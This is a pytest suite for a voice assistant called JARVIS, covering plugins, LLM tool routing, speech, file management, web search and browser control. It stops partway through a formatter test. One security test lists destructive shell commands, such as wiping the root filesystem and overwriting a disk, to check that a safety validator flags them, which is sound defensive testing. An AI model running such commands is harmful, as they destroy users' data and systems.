"""
Comprehensive Test Suite for JARVIS
Production-ready testing with pytest
"""

import pytest
import sys
import os
from pathlib import Path
import json
import time
from unittest.mock import Mock, MagicMock, patch
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def jarvis_instance():
    """Create a JARVIS instance for testing"""
    from jarvis import JARVIS
    jarvis = JARVIS()
    yield jarvis
    # Cleanup
    if jarvis.voice_assistant:
        jarvis.voice_assistant.cleanup()


@pytest.fixture
def plugin_manager():
    """Create plugin manager for testing"""
    from modules.plugin_system import PluginManager
    # Use absolute path to plugins directory
    plugins_dir = Path(__file__).parent.parent / "plugins"
    pm = PluginManager(plugins_dir)
    pm.load_all_plugins()
    yield pm
    pm.cleanup_all()


@pytest.fixture
def llm_router(jarvis_instance):
    """Create LLM router for testing"""
    from modules.llm_tool_router import LLMToolRouter
    router = LLMToolRouter(
        llm_client=jarvis_instance,
        plugin_manager=jarvis_instance.plugin_manager
    )
    yield router


@pytest.fixture
def weather_plugin():
    """Create weather plugin for testing"""
    from plugins.weather_plugin import WeatherPlugin
    plugin = WeatherPlugin()
    plugin.initialize()
    yield plugin
    plugin.cleanup()


@pytest.fixture
def speech_to_text():
    """Create speech-to-text instance"""
    from modules.speech_to_text import SpeechToText
    stt = SpeechToText(model_size="base", language="en")
    yield stt
    stt.cleanup()


@pytest.fixture
def text_to_speech():
    """Create text-to-speech instance"""
    from modules.text_to_speech import TextToSpeech
    tts = TextToSpeech(
        voice="en-GB-RyanNeural",
        enable_ducking=False  # Disable for tests
    )
    yield tts
    tts.cleanup()


# ============================================================================
# PLUGIN SYSTEM TESTS
# ============================================================================

class TestPluginSystem:
    """Test plugin discovery and loading"""
    
    def test_plugin_manager_initialization(self):
        """Test plugin manager creates correctly"""
        from modules.plugin_system import PluginManager
        pm = PluginManager(Path.home() / "jarvis" / "plugins")
        
        assert pm.plugins_dir.exists()
        assert len(pm.plugins) == 0
        assert len(pm.tools) == 0
    
    def test_plugin_discovery(self, plugin_manager):
        """Test plugin discovery finds all plugins"""
        plugins = plugin_manager.discover_plugins()
        
        assert len(plugins) >= 3  # weather, example, spotify
        assert "weather_plugin" in plugins
        assert "example_plugin" in plugins
        assert "spotify_plugin" in plugins
    
    def test_plugin_loading(self, plugin_manager):
        """Test plugins load successfully"""
        assert len(plugin_manager.plugins) >= 3
        
        assert "weather" in plugin_manager.plugins
        assert "example" in plugin_manager.plugins
        assert "spotify" in plugin_manager.plugins
    
    def test_plugin_tools_registered(self, plugin_manager):
        """Test plugin tools are registered"""
        tools = plugin_manager.list_tools()
        
        # Weather tools
        assert "weather.current" in tools
        assert "weather.forecast" in tools
        assert "weather.time" in tools
        
        # Example tools
        assert "example.hello" in tools
        assert "example.example_action" in tools
        
        # Spotify tools
        assert "spotify.play" in tools
        assert "spotify.pause" in tools
        assert "spotify.now_playing" in tools
    
    def test_plugin_metadata(self, plugin_manager):
        """Test plugin metadata is correct"""
        status = plugin_manager.get_plugin_status()
        
        assert "weather" in status
        assert status["weather"]["version"] == "1.0.0"
        assert status["weather"]["status"] == "loaded"
        
        assert "example" in status
        assert status["example"]["version"] == "1.0.0"
    
    def test_plugin_unload(self, plugin_manager):
        """Test plugin unloading"""
        initial_count = len(plugin_manager.plugins)
        
        plugin_manager.unload_plugin("example")
        
        assert len(plugin_manager.plugins) == initial_count - 1
        assert "example" not in plugin_manager.plugins
    
    def test_plugin_system_prompt_aggregation(self, plugin_manager):
        """Test system prompt aggregation from plugins"""
        prompt = plugin_manager.get_aggregated_system_prompt()
        
        assert "weather" in prompt.lower() or len(prompt) > 0
        assert "Plugin" in prompt or "Tools" in prompt


# ============================================================================
# WEATHER PLUGIN TESTS
# ============================================================================

class TestWeatherPlugin:
    """Test weather plugin functionality"""
    
    def test_weather_plugin_initialization(self, weather_plugin):
        """Test weather plugin initializes"""
        assert weather_plugin.name == "weather"
        assert weather_plugin.version == "1.0.0"
        assert weather_plugin.description == "Weather information (free, no API key)"
    
    def test_weather_tools_available(self, weather_plugin):
        """Test weather tools are available"""
        tools = weather_plugin.get_tools()
        
        assert "current" in tools
        assert "forecast" in tools
        assert "set_location" in tools
        assert "time" in tools
    
    def test_weather_time_tool(self, weather_plugin):
        """Test time tool returns correct format"""
        result = weather_plugin.get_time()
        
        assert result["success"] is True
        assert "time" in result
        assert "date" in result
        
        # Verify time format (HH:MM:SS)
        time_parts = result["time"].split(":")
        assert len(time_parts) == 3
        assert 0 <= int(time_parts[0]) <= 23
        assert 0 <= int(time_parts[1]) <= 59
        assert 0 <= int(time_parts[2]) <= 59
    
    def test_weather_current_tool(self, weather_plugin):
        """Test current weather tool"""
        result = weather_plugin.get_current_weather()
        
        # Should return success or error gracefully
        assert "success" in result or "error" in result
    
    def test_weather_set_location(self, weather_plugin):
        """Test setting location"""
        result = weather_plugin.set_location("London")
        
        assert result["success"] is True
        assert weather_plugin.default_location == "London"
    
    def test_weather_system_prompt(self, weather_plugin):
        """Test weather plugin system prompt"""
        prompt = weather_plugin.get_system_prompt_addition()
        
        assert "weather" in prompt.lower()
        assert "current" in prompt.lower() or "forecast" in prompt.lower()


# ============================================================================
# LLM TOOL ROUTER TESTS
# ============================================================================

class TestLLMToolRouter:
    """Test LLM-powered tool routing"""
    
    def test_router_initialization(self, llm_router):
        """Test router initializes correctly"""
        assert llm_router.llm is not None
        assert llm_router.plugin_manager is not None
    
    def test_time_query_routing(self, llm_router):
        """Test time queries route to weather.time"""
        test_cases = [
            "What time is it?",
            "What's the time?",
            "Current time please",
            "Tell me the time",
        ]
        
        for query in test_cases:
            result = llm_router.route(query)
            assert result["tool"] == "weather.time", f"Failed for: {query}"
    
    def test_spotify_play_routing(self, llm_router):
        """Test play commands route to spotify"""
        test_cases = [
            "Play some music",
            "Play Bohemian Rhapsody",
        ]
        
        for query in test_cases:
            result = llm_router.route(query)
            # Should route somewhere (spotify or llm for conversational)
            assert "tool" in result, f"Missing tool in result for: {query}"
            assert "parameters" in result, f"Missing parameters for: {query}"
    
    def test_spotify_pause_routing(self, llm_router):
        """Test pause commands route to spotify.pause"""
        test_cases = [
            "Pause",
            "Pause the music",
            "Stop the music",
        ]
        
        for query in test_cases:
            result = llm_router.route(query)
            assert result["tool"] == "spotify.pause", f"Failed for: {query}"
    
    def test_spotify_now_playing_routing(self, llm_router):
        """Test now playing queries route correctly"""
        # At least one of these should route to spotify
        query = "What's playing?"
        result = llm_router.route(query)
        
        # Should route somewhere (spotify or llm for conversational response)
        assert "tool" in result
        assert "parameters" in result
    
    def test_weather_query_routing(self, llm_router):
        """Test weather queries route correctly"""
        test_cases = [
            "What's the weather?",
            "Weather forecast",
        ]
        
        for query in test_cases:
            result = llm_router.route(query)
            # Should route to weather plugin
            assert "weather" in result["tool"].lower(), f"Failed for: {query}"
    
    def test_router_json_extraction(self, llm_router):
        """Test JSON extraction from LLM responses"""
        # Test various JSON formats
        test_responses = [
            '{"tool": "spotify.play", "parameters": {}}',
            '```json\n{"tool": "spotify.pause"}\n```',
            'Sure! {"tool": "weather.time"}',
            '{"tool": "example.hello", "reasoning": "test"}',
        ]
        
        for response in test_responses:
            result = llm_router._extract_json(response)
            assert result is not None, f"Failed to extract JSON from: {response}"
            assert "tool" in result
    
    def test_router_tool_execution(self, jarvis_instance):
        """Test tool execution through executor"""
        from modules.llm_tool_router import LLMToolExecutor
        
        executor = LLMToolExecutor(jarvis_instance)
        
        # Test weather.time execution
        result = executor._execute_plugin_tool("weather.time", {})
        assert "time" in result.lower() or "success" in result.lower() or "The current" in result


# ============================================================================
# AUDIO DUCKING TESTS
# ============================================================================

class TestAudioDucking:
    """Test audio ducking functionality"""
    
    def test_ducker_initialization(self):
        """Test audio ducker initializes"""
        from modules.text_to_speech import AudioDucker
        
        ducker = AudioDucker(ducking_level=0.3)
        
        assert ducker.ducking_level == 0.3
        assert ducker.is_ducked is False
    
    def test_ducker_pulseaudio_check(self):
        """Test PulseAudio availability check"""
        from modules.text_to_speech import AudioDucker
        
        ducker = AudioDucker()
        
        # Should return boolean
        assert isinstance(ducker.pulse_available, bool)
    
    def test_ducker_context_manager(self):
        """Test ducker as context manager"""
        from modules.text_to_speech import AudioDucker
        
        ducker = AudioDucker(ducking_level=0.3)
        
        with ducker:
            # Should be ducked inside context
            pass
        
        # Should be restored after context
        assert ducker.is_ducked is False
    
    def test_tts_ducking_enabled(self, text_to_speech):
        """Test TTS has ducking enabled"""
        assert text_to_speech.enable_ducking is False  # Disabled for tests
        assert text_to_speech.ducker is None
    
    def test_tts_ducking_configuration(self):
        """Test TTS ducking configuration"""
        from modules.text_to_speech import TextToSpeech
        
        tts = TextToSpeech(enable_ducking=True, ducking_level=0.25)
        
        assert tts.enable_ducking is True
        assert tts.ducker is not None
        assert tts.ducker.ducking_level == 0.25
        
        tts.cleanup()


# ============================================================================
# SPEECH RECOGNITION TESTS
# ============================================================================

class TestSpeechRecognition:
    """Test speech-to-text functionality"""
    
    def test_stt_initialization(self, speech_to_text):
        """Test STT initializes with correct model"""
        assert speech_to_text.model_size == "base"
        assert speech_to_text.language == "en"
        assert speech_to_text.model is not None
    
    def test_stt_command_corrections(self, speech_to_text):
        """Test command correction dictionary"""
        corrections = speech_to_text.command_corrections
        
        # Should have pause corrections
        assert "thank you very much" in corrections
        assert corrections["thank you very much"] == "pause"
        
        assert "pulse" in corrections
        assert corrections["pulse"] == "pause"
    
    def test_stt_post_processing(self, speech_to_text):
        """Test transcription post-processing"""
        # Test exact matches - these should be in the corrections dict
        corrections = speech_to_text.command_corrections
        
        # Verify corrections exist
        assert "thank you very much" in corrections
        assert corrections["thank you very much"] == "pause"
        
        assert "pulse" in corrections
        assert corrections["pulse"] == "pause"
        
        # Test the post-processing function
        result = speech_to_text._post_process_transcription("thank you very much")
        assert result == "pause"
        
        # Test no correction needed - should return as-is
        result = speech_to_text._post_process_transcription("play music")
        assert "play" in result  # Contains the original text
    
    def test_stt_model_loading(self):
        """Test STT model loading with different sizes"""
        from modules.speech_to_text import SpeechToText
        
        # Test base model (default)
        stt_base = SpeechToText(model_size="base")
        assert stt_base.model is not None
        stt_base.cleanup()
        
        # Test tiny model (faster)
        stt_tiny = SpeechToText(model_size="tiny")
        assert stt_tiny.model is not None
        stt_tiny.cleanup()


# ============================================================================
# TEXT-TO-SPEECH TESTS
# ============================================================================

class TestTextToSpeech:
    """Test text-to-speech functionality"""
    
    def test_tts_initialization(self, text_to_speech):
        """Test TTS initializes with correct voice"""
        assert text_to_speech.voice == "en-GB-RyanNeural"
    
    def test_tts_voice_list(self, text_to_speech):
        """Test voice listing"""
        # Should not raise exception
        text_to_speech.list_voices()
    
    def test_tts_speech_generation(self, text_to_speech):
        """Test speech generation"""
        # Test with wait=False to avoid blocking
        text_to_speech.speak("Test", wait=False, duck_audio=False)
        # Should not raise exception
    
    def test_tts_voice_settings(self, text_to_speech):
        """Test voice setting changes"""
        text_to_speech.set_voice("en-US-JennyNeural")
        assert text_to_speech.voice == "en-US-JennyNeural"
        
        text_to_speech.set_rate(150)
        assert text_to_speech.rate == "+150%"
    
    def test_tts_ducking_toggle(self, text_to_speech):
        """Test ducking enable/disable"""
        text_to_speech.set_ducking(True, level=0.4)
        assert text_to_speech.enable_ducking is True
        assert text_to_speech.ducker is not None
        
        text_to_speech.set_ducking(False)
        assert text_to_speech.enable_ducking is False
        assert text_to_speech.ducker is None


# ============================================================================
# VOICE ASSISTANT TESTS
# ============================================================================

class TestVoiceAssistant:
    """Test voice assistant integration"""
    
    def test_voice_assistant_initialization(self, jarvis_instance):
        """Test voice assistant initializes"""
        assert jarvis_instance.voice_assistant is not None
        
        va = jarvis_instance.voice_assistant
        assert va.stt is not None
        assert va.tts is not None
        assert va.formatter is not None
    
    def test_voice_assistant_stt_model(self, jarvis_instance):
        """Test voice assistant uses base model"""
        va = jarvis_instance.voice_assistant
        assert va.stt.model_size == "base"
    
    def test_voice_assistant_tts_voice(self, jarvis_instance):
        """Test voice assistant uses correct TTS voice"""
        va = jarvis_instance.voice_assistant
        assert va.tts.voice == "en-GB-RyanNeural"
    
    def test_voice_assistant_formatter(self, jarvis_instance):
        """Test response formatter exists"""
        va = jarvis_instance.voice_assistant
        assert va.formatter is not None


# ============================================================================
# INTEGRATION TESTS
# ============================================================================

class TestIntegration:
    """Integration tests for complete workflows"""
    
    def test_full_time_query_workflow(self, jarvis_instance):
        """Test complete time query workflow"""
        # Simulate user asking for time
        result = jarvis_instance.process_command("What time is it?")
        
        # Should contain time information
        assert "time" in result.lower() or ":" in result
    
    def test_full_weather_query_workflow(self, jarvis_instance):
        """Test complete weather query workflow"""
        result = jarvis_instance.process_command("What's the weather?")
        
        # Should attempt to get weather (may fail without API)
        assert isinstance(result, str)
    
    def test_plugin_tool_execution_workflow(self, jarvis_instance):
        """Test plugin tool execution through full stack"""
        # Test weather.time through LLM router
        result = jarvis_instance.process_command("Tell me the time")
        
        assert "time" in result.lower() or "success" in result.lower()
    
    def test_conversation_memory(self, jarvis_instance):
        """Test conversation memory works"""
        initial_length = len(jarvis_instance.conversation_history)
        
        # First message
        jarvis_instance.process_command("Hello")
        
        # Check memory increased (may add 2 messages: user + assistant)
        assert len(jarvis_instance.conversation_history) >= initial_length

    def test_compound_command_parsing(self, jarvis_instance):
        """Test compound command parsing"""
        # Test "open chrome and navigate to github"
        steps = jarvis_instance.parse_compound_command(
            "open chrome and navigate to github"
        )
        
        # May or may not detect as compound depending on parsing
        assert isinstance(steps, list)


# ============================================================================
# END-TO-END TESTS
# ============================================================================

class TestEndToEnd:
    """End-to-end tests for complete user scenarios"""
    
    def test_e2e_voice_mode_activation(self, jarvis_instance):
        """Test complete voice mode activation"""
        # Toggle voice mode
        jarvis_instance.toggle_voice_mode()
        
        assert jarvis_instance.voice_mode is True
        
        # Toggle off
        jarvis_instance.toggle_voice_mode()
        assert jarvis_instance.voice_mode is False
    
    def test_e2e_plugin_listing(self, jarvis_instance):
        """Test listing all plugins"""
        if jarvis_instance.plugin_manager:
            status = jarvis_instance.plugin_manager.get_plugin_status()
            
            assert len(status) >= 3
            assert "weather" in status
            assert "spotify" in status
    
    def test_e2e_help_command(self, jarvis_instance):
        """Test help command shows all features"""
        # Should not raise exception
        jarvis_instance.show_help()
    
    def test_e2e_context_clear(self, jarvis_instance):
        """Test clearing conversation context"""
        initial_length = len(jarvis_instance.conversation_history)
        
        # Add some messages
        jarvis_instance.conversation_history.append(
            {"role": "user", "content": "test"}
        )
        jarvis_instance.conversation_history.append(
            {"role": "assistant", "content": "response"}
        )
        
        # Clear
        result = jarvis_instance.clear_context()
        
        # Should have cleared some messages
        assert len(jarvis_instance.conversation_history) <= initial_length
        assert isinstance(result, str)


# ============================================================================
# PERFORMANCE TESTS
# ============================================================================

class TestPerformance:
    """Performance and load tests"""
    
    def test_plugin_load_time(self):
        """Test plugins load within acceptable time"""
        from modules.plugin_system import PluginManager
        import time
        
        start = time.time()
        pm = PluginManager(Path.home() / "jarvis" / "plugins")
        pm.load_all_plugins()
        elapsed = time.time() - start
        
        # Should load within 5 seconds
        assert elapsed < 5.0, f"Plugin loading took {elapsed:.2f}s"
    
    def test_llm_routing_time(self, llm_router):
        """Test LLM routing completes quickly"""
        import time

        start = time.time()
        result = llm_router.route("What time is it?")
        elapsed = time.time() - start

        # Should route within 10 seconds (LLM inference time)
        assert elapsed < 10.0, f"LLM routing took {elapsed:.2f}s"
    
    def test_tts_generation_time(self, text_to_speech):
        """Test TTS generation time"""
        import time
        
        start = time.time()
        text_to_speech.speak("Test message", wait=False, duck_audio=False)
        elapsed = time.time() - start
        
        # Should generate within 2 seconds
        assert elapsed < 2.0, f"TTS generation took {elapsed:.2f}s"


# ============================================================================
# ERROR HANDLING TESTS
# ============================================================================

class TestErrorHandling:
    """Test error handling and edge cases"""
    
    def test_plugin_not_found_error(self, plugin_manager):
        """Test handling of missing plugin"""
        result = plugin_manager.get_tool("nonexistent.tool")
        assert result is None
    
    def test_invalid_tool_name(self, jarvis_instance):
        """Test handling of invalid tool names"""
        from modules.llm_tool_router import LLMToolExecutor
        
        executor = LLMToolExecutor(jarvis_instance)
        result = executor._execute_plugin_tool("invalid.tool.name", {})
        assert "Invalid" in result or "not found" in result.lower() or "Plugin not loaded" in result
    
    def test_empty_command(self, jarvis_instance):
        """Test handling of empty commands"""
        result = jarvis_instance.process_command("")
        assert result is not None
    
    def test_malformed_json_routing(self, llm_router):
        """Test handling of malformed JSON in routing"""
        malformed_responses = [
            "not json at all",
            '{"tool": }',
            '{"tool": "test", invalid}',
            '',
        ]
        
        for response in malformed_responses:
            result = llm_router._extract_json(response)
            # Should return None for invalid JSON
            assert result is None
    
    def test_tts_fallback(self):
        """Test TTS fallback when Edge TTS fails"""
        from modules.text_to_speech import TextToSpeech
        
        tts = TextToSpeech(enable_ducking=False)
        
        # Should not crash even if Edge TTS fails
        try:
            tts.speak("Test", wait=False, duck_audio=False)
        except Exception as e:
            pytest.fail(f"TTS should handle errors gracefully: {e}")
        finally:
            tts.cleanup()


# ============================================================================
# SECURITY TESTS
# ============================================================================

class TestSecurity:
    """Security and safety tests"""
    
    def test_safety_validator_dangerous_commands(self):
        """Test safety validator catches dangerous commands"""
        from modules.safety_validator import SafetyValidator
        
        validator = SafetyValidator()
        
        dangerous = [
            "sudo rm -rf /",
            "chmod 777 /etc/passwd",
            "dd if=/dev/zero of=/dev/sda",
        ]
        
        for cmd in dangerous:
            risk, reason = validator.classify(cmd)
            assert risk == "high", f"Failed to detect dangerous command: {cmd}"
    
    def test_safety_validator_safe_commands(self):
        """Test safety validator allows safe commands"""
        from modules.safety_validator import SafetyValidator
        
        validator = SafetyValidator(auto_approve_safe=True)
        
        safe = [
            "ls -la",
            "cat file.txt",
            "pwd",
        ]
        
        for cmd in safe:
            risk, reason = validator.classify(cmd)
            assert risk == "safe", f"Failed to detect safe command: {cmd}"
    
    def test_plugin_isolation(self, plugin_manager):
        """Test plugins don't have access to system files"""
        # Plugins should only access their own tools
        for plugin_name, plugin in plugin_manager.plugins.items():
            tools = plugin.get_tools()
            
            # Tools should be callable methods
            for tool_name, tool_func in tools.items():
                assert callable(tool_func)


# ============================================================================
# FILE MANAGER TESTS
# ============================================================================

class TestFileManager:
    """Test file management operations"""

    def test_file_manager_initialization(self):
        """Test file manager initializes with backup directory"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=True)

        assert fm.backup_enabled is True
        assert fm.backup_dir.exists()
        assert fm.operation_log.parent.exists()

    def test_file_manager_read_nonexistent(self):
        """Test reading nonexistent file returns error"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        result = fm.read_file("/nonexistent/path/file.txt")

        assert result["success"] is False
        assert "not found" in result["error"].lower()

    def test_file_manager_write_and_read(self, tmp_path):
        """Test writing and reading a file"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        test_file = tmp_path / "test.txt"
        content = "Hello, JARVIS!"

        write_result = fm.write_file(str(test_file), content)
        assert write_result["success"] is True

        read_result = fm.read_file(str(test_file))
        assert read_result["success"] is True
        assert read_result["content"] == content

    def test_file_manager_append_mode(self, tmp_path):
        """Test appending to a file"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        test_file = tmp_path / "append_test.txt"

        # Write initial content
        fm.write_file(str(test_file), "Line 1\n")

        # Append more content
        append_result = fm.write_file(str(test_file), "Line 2\n", mode="a")
        assert append_result["success"] is True

        # Verify both lines exist
        read_result = fm.read_file(str(test_file))
        assert "Line 1" in read_result["content"]
        assert "Line 2" in read_result["content"]

    def test_file_manager_backup_creation(self, tmp_path):
        """Test backup is created before modification"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=True)

        test_file = tmp_path / "backup_test.txt"
        fm.write_file(str(test_file), "Original content")

        # Modify file (should create backup)
        fm.write_file(str(test_file), "Modified content")

        # Check backup was created
        backups = list(fm.backup_dir.glob("*.backup"))
        assert len(backups) > 0

    def test_file_manager_delete_with_backup(self, tmp_path):
        """Test file deletion creates backup"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=True)

        test_file = tmp_path / "delete_test.txt"
        fm.write_file(str(test_file), "To be deleted")

        delete_result = fm.delete_file(str(test_file), confirm=True)
        assert delete_result["success"] is True
        assert not test_file.exists()
        assert delete_result["backup"] is not None

    def test_file_manager_list_directory(self, tmp_path):
        """Test directory listing"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        # Create test files
        (tmp_path / "file1.txt").touch()
        (tmp_path / "file2.py").touch()
        (tmp_path / "subdir").mkdir()

        result = fm.list_directory(str(tmp_path))
        assert result["success"] is True
        assert result["count"] == 3

    def test_file_manager_list_directory_pattern(self, tmp_path):
        """Test directory listing with pattern"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        # Create test files
        (tmp_path / "test1.py").touch()
        (tmp_path / "test2.py").touch()
        (tmp_path / "readme.md").touch()

        result = fm.list_directory(str(tmp_path), pattern="*.py")
        assert result["success"] is True
        assert result["count"] == 2

    def test_file_manager_special_folders(self):
        """Test listing special folder names"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        # Test home folder
        result = fm.list_directory("~")
        assert result["success"] is True

        # Test downloads folder
        result = fm.list_directory("downloads")
        assert result["success"] is True or "not found" in result.get("error", "").lower()

    def test_file_manager_get_file_info(self, tmp_path):
        """Test getting file information"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        test_file = tmp_path / "info_test.txt"
        test_file.write_text("Test content for file info")

        result = fm.get_file_info(str(test_file))
        assert result["success"] is True
        info = result["info"]
        assert info["name"] == "info_test.txt"
        assert info["size"] > 0
        assert info["extension"] == ".txt"
        assert info["is_file"] is True
        assert info["is_dir"] is False

    def test_file_manager_create_directory(self, tmp_path):
        """Test creating directories"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        new_dir = tmp_path / "nested" / "deep" / "directory"

        result = fm.create_directory(str(new_dir))
        assert result["success"] is True
        assert new_dir.exists()

    def test_file_manager_move_file(self, tmp_path):
        """Test moving files"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        src = tmp_path / "source.txt"
        dst = tmp_path / "destination.txt"
        src.write_text("Move me")

        result = fm.move_file(str(src), str(dst))
        assert result["success"] is True
        assert not src.exists()
        assert dst.exists()

    def test_file_manager_copy_file(self, tmp_path):
        """Test copying files"""
        from modules.file_manager import FileManager
        fm = FileManager(backup_enabled=False)

        src = tmp_path / "original.txt"
        dst = tmp_path / "copy.txt"
        src.write_text("Copy me")

        result = fm.copy_file(str(src), str(dst))
        assert result["success"] is True
        assert src.exists()
        assert dst.exists()
        assert src.read_text() == dst.read_text()


# ============================================================================
# WEB SEARCH TESTS
# ============================================================================

class TestWebSearch:
    """Test web search functionality"""

    def test_web_searcher_initialization(self):
        """Test web searcher initializes"""
        from modules.web_search import WebSearcher
        searcher = WebSearcher(searxng_url="http://localhost:8080")

        assert searcher.searxng_url == "http://localhost:8080"
        assert searcher.session is not None

    def test_web_searcher_url_normalization(self):
        """Test URL trailing slash is handled"""
        from modules.web_search import WebSearcher

        searcher1 = WebSearcher(searxng_url="http://localhost:8080/")
        searcher2 = WebSearcher(searxng_url="http://localhost:8080")

        assert searcher1.searxng_url == searcher2.searxng_url

    def test_web_search_connection_failure(self):
        """Test search handles connection failure gracefully"""
        from modules.web_search import WebSearcher
        searcher = WebSearcher(searxng_url="http://invalid-host-12345:9999")

        result = searcher.search("test query")

        # Should return error result, not crash
        assert len(result) == 1
        assert result[0]["engine"] == "error"
        assert "Cannot connect" in result[0]["snippet"]

    def test_web_search_timeout_handling(self):
        """Test search handles timeout gracefully"""
        from modules.web_search import WebSearcher
        # Use a URL that will timeout
        searcher = WebSearcher(searxng_url="http://10.255.255.1:80")

        result = searcher.search("test query")

        # Should handle timeout without crashing
        assert isinstance(result, list)

    def test_web_search_news_method(self):
        """Test news search method"""
        from modules.web_search import WebSearcher
        searcher = WebSearcher(searxng_url="http://invalid:8080")

        # Should call search with news category
        result = searcher.search_news("tech news")
        assert isinstance(result, list)

    def test_web_search_images_method(self):
        """Test image search method"""
        from modules.web_search import WebSearcher
        searcher = WebSearcher(searxng_url="http://invalid:8080")

        result = searcher.search_images("cats")
        assert isinstance(result, list)

    def test_web_search_instant_answer(self):
        """Test instant answer retrieval"""
        from modules.web_search import WebSearcher
        searcher = WebSearcher(searxng_url="http://invalid:8080")

        # Should handle error gracefully
        result = searcher.instant_answer("what is python")
        assert result is None or isinstance(result, str)

    def test_web_search_max_results(self):
        """Test max results parameter"""
        from modules.web_search import WebSearcher
        searcher = WebSearcher(searxng_url="http://invalid:8080")

        # Should not crash with different max_results values
        result = searcher.search("test", max_results=1)
        assert isinstance(result, list)

        result = searcher.search("test", max_results=10)
        assert isinstance(result, list)


# ============================================================================
# BROWSER CONTROLLER TESTS
# ============================================================================

class TestBrowserController:
    """Test browser automation"""

    def test_browser_controller_initialization(self):
        """Test browser controller initializes"""
        from modules.browser_controller import BrowserController
        browser = BrowserController(headless=True)

        assert browser.headless is True
        assert browser.is_running is False
        assert browser.page is None

    def test_browser_controller_stop_when_not_running(self):
        """Test stopping browser when not running"""
        from modules.browser_controller import BrowserController
        browser = BrowserController(headless=True)

        result = browser.stop()
        assert result["success"] is True

    def test_browser_controller_navigate_url_normalization(self):
        """Test URL normalization in navigate"""
        from modules.browser_controller import BrowserController
        browser = BrowserController(headless=True)

        # Test URL extraction patterns
        url = browser._extract_url("go to youtube.com")
        assert url == "youtube.com"

        url = browser._extract_url("open google")
        assert url == "google.com"

    def test_browser_controller_extract_url_common_sites(self):
        """Test URL extraction for common sites"""
        from modules.browser_controller import BrowserController
        browser = BrowserController(headless=True)

        common_sites = {
            "open youtube": "youtube.com",
            "go to github": "github.com",
            "visit reddit": "reddit.com",
            "browse twitter": "twitter.com",
        }

        for instruction, expected in common_sites.items():
            url = browser._extract_url(instruction)
            assert url == expected, f"Failed for: {instruction}"

    def test_browser_controller_extract_url_explicit(self):
        """Test explicit URL extraction"""
        from modules.browser_controller import BrowserController
        browser = BrowserController(headless=True)

        url = browser._extract_url("navigate to https://example.com/path")
        assert url == "https://example.com/path"

        url = browser._extract_url("go to http://test.org")
        assert url == "http://test.org"

    def test_browser_controller_get_page_info_not_running(self):
        """Test get page info when browser not running"""
        from modules.browser_controller import BrowserController
        browser = BrowserController(headless=True)

        result = browser.get_page_info()
        assert "error" in result
        assert result["url"] == ""
        assert result["title"] == ""

    def test_browser_controller_selector_extraction(self):
        """Test CSS selector extraction"""
        from modules.browser_controller import BrowserController
        browser = BrowserController(headless=True)

        assert browser._extract_selector("click the button") == "button"
        assert browser._extract_selector("click the link") == "a"
        assert "input" in browser._extract_selector("click search")

    def test_browser_controller_playwright_availability(self):
        """Test playwright availability check"""
        from modules.browser_controller import PLAYWRIGHT_AVAILABLE

        # Should be a boolean
        assert isinstance(PLAYWRIGHT_AVAILABLE, bool)


# ============================================================================
# VOICE RESPONSE FORMATTER TESTS
# ============================================================================

class TestVoiceResponseFormatter:
    """Test voice response formatting"""

    def test_formatter_initialization(self):
        """Test formatter initializes"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter(llm_client=None)

        assert formatter.llm is None

    def test_formatter_detect_file_listing(self):
        """Test file listing detection"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        ls_output = "drwxr-xr-x 1 user user 4096 Mar 10 12:00 documents"
        assert formatter._detect_response_type(ls_output) == "file_listing"

    def test_formatter_detect_error(self):
        """Test error detection"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        error_msg = "Error: command not found"
        assert formatter._detect_response_type(error_msg) == "error"

    def test_formatter_summarize_empty_file_listing(self):
        """Test empty file listing summary"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        result = formatter._summarize_file_listing("", "list files")
        assert "empty" in result.lower()

    def test_formatter_summarize_small_file_listing(self):
        """Test small file listing summary"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        ls_output = """drwxr-xr-x documents
-rw-r--r-- file1.txt
-rw-r--r-- file2.txt"""

        result = formatter._summarize_file_listing(ls_output, "list files")
        assert "items" in result.lower() or "folder" in result.lower()

    def test_formatter_humanize_error_not_found(self):
        """Test humanizing 'not found' errors"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        result = formatter._humanize_error("Error: file not found")
        assert "couldn't find" in result.lower() or "not found" in result.lower()

    def test_formatter_humanize_error_permission(self):
        """Test humanizing permission errors"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        result = formatter._humanize_error("Permission denied")
        assert "denied" in result.lower() or "access" in result.lower()

    def test_formatter_humanize_error_network(self):
        """Test humanizing network errors"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        result = formatter._humanize_error("Connection error: network unreachable")
        assert "connect" in result.lower() or "network" in result.lower()

    def test_formatter_clean_for_speech(self):
        """Test cleaning text for speech"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        markdown_text = "**Bold** and *italic* with `code`"
        cleaned = formatter._clean_for_speech(markdown_text)

        assert "**" not in cleaned
        assert "*" not in cleaned
        assert "`" not in cleaned

    def test_formatter_clean_special_characters(self):
        """Test cleaning special characters"""
        from modules.voice_response_formatter import VoiceResponseFormatter
        formatter = VoiceResponseFormatter()

        text = "✓ Success → Done • Item"
